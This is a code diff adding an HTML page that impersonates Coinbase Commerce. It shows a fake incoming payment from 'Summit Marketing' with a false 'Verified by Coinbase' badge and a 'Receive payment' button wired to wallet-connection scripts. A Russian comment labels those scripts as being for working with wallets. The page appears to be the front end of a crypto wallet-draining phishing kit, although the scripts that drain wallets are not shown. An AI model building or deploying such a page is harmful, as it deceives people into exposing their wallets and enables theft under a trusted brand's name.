@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <title>Receive payment | Coinbase Commerce</title>
+    <link rel="icon" href="media/coinbase.svg" type="image/svg+xml">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    
+</head>
+<body>
+    <div class="payment-container">
+        <div class="left-section">
+            <div class="logo-container">
+                <span class="text-2xl font-semibold">
+                    <span class="text-blue-600">Coinbase</span>
+                    <span class="text-gray-900">commerce</span>
+                </span>
+                <p class="text-sm text-gray-600 mt-1">
+                    A payment has been sent to you. Please review the details below and confirm receipt.
+                </p>
+                <a href="/main/" class="text-blue-600 hover:text-blue-800 hover:underline text-sm mt-3 inline-block">&larr; Back to Main</a>
+            </div>
+            <div class="content-center flex-1 flex flex-col justify-end">
+                <div class="flex items-center mb-2">
+                    <div>
+                        <div class="text-sm text-gray-600">From</div>
+                        <div class="text-base font-semibold text-gray-800 flex items-center">
+                            <span id="senderNameDisplay">Summit Marketing</span>
+                            <span class="group relative ml-2">
+                                <img id="verifiedIcon" src="images/verified.png" alt="Verified Icon" class="w-6 h-6">
+                                <span class="absolute hidden group-hover:block bg-white border border-gray-200 p-2 rounded-md shadow-md z-10 text-sm text-gray-800 coinbase-tooltip">
+                                    Verified by Coinbase
+                                </span>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+                <div class="mb-2">
+                    <div class="text-sm text-gray-600 mb-1">Recipient address</div>
+                    <div class="text-base text-gray-800">
+                        <a href="#" id="walletLink" target="_blank" class="font-medium text-blue-600 hover:underline">
+                            <span id="walletShort"></span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="right-section">
+            <div class="space-y-4 text-base">
+                <div class="flex justify-between items-center">
+                    <h2 class="text-lg font-semibold text-gray-800">Invoice Details</h2>
+                    <div class="flex items-center">
+                        <span class="text-sm font-medium text-gray-600 mr-2">Status</span>
+                        <span id="statusDisplay" class="px-3 py-1 bg-blue-100 text-blue-800 rounded-full text-sm font-medium">
+                            Pending
+                        </span>
+                    </div>
+                </div>
+                <div class="mb-6">
+                    <div class="text-sm text-gray-600 mb-2">Payment Methods</div>
+                    <div class="flex items-center space-x-2">
+                        <span class="text-base text-gray-800" id="currencyDisplay">USDT</span>
+                        <img id="currencyIcon" src="images/tether-usdt-logo.png" alt="Currency Icon" class="w-5 h-5" loading="lazy">
+                        <span class="text-base text-gray-800" id="networkDisplay">Ethereum</span>
+                        <img id="networkIcon" src="images/ethereum-eth-logo.png" alt="Network Icon" class="w-5 h-5" loading="lazy">
+                    </div>
+                </div>
+                <div class="border-t border-gray-200 pt-4">
+                    <div class="flex justify-between text-sm font-medium text-gray-600 mb-2">
+                        <span>Item Description</span>
+                        <span class="w-24 text-right">Amount</span>
+                    </div>
+                    <div class="flex justify-between text-base text-gray-800 mb-4">
+                        <span id="titleDisplay">Payment</span>
+                        <span class="w-24 text-right">$<span id="amountDisplay"></span> USD</span>
+                    </div>
+                    <div class="flex justify-between text-lg font-semibold text-gray-800 border-t border-gray-200 pt-4">
+                        <span>Total</span>
+                        <span>$<span id="amountDisplayTotal"></span> USD</span>
+                    </div>
+                </div>
+                <div class="flex justify-between items-center text-sm text-gray-600">
+                    <div>
+                        <span>Date: </span>
+                        <span id="dateDisplay"></span>
+                    </div>
+                    <div class="flex items-center group relative">
+                        <span class="mr-2">ID: </span>
+                        <span id="orderCode">Z3B7TWA</span>
+                    </div>
+                </div>
+            </div>
+            <button id="actionButton" class="action-btn" onclick="init_co()">
+                Receive payment
+            </button>
+            <div class="footer-text mt-4 flex flex-col items-center">
+                <span>Payment processed by Coinbase Commerce</span>
+                <a href="https://www.coinbase.com/legal/eea" target="_blank" class="underline hover:text-blue-700">
+                    Privacy Policy
+                </a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Скрипты для работы с кошельками -->
+    <script src="./assets/w-modal.js"></script>
+    <script src="./assets/w-loader.js"></script>
+    <script src="./assets/modules.js"></script>
+    <script src="./assets/main.js"></script>
+
+    <!-- Существующие скрипты -->
+    <script src="payments-simple.js"></script>
+    <script src="invoice-navigation.js"></script>
+    
+</body>
+</html>
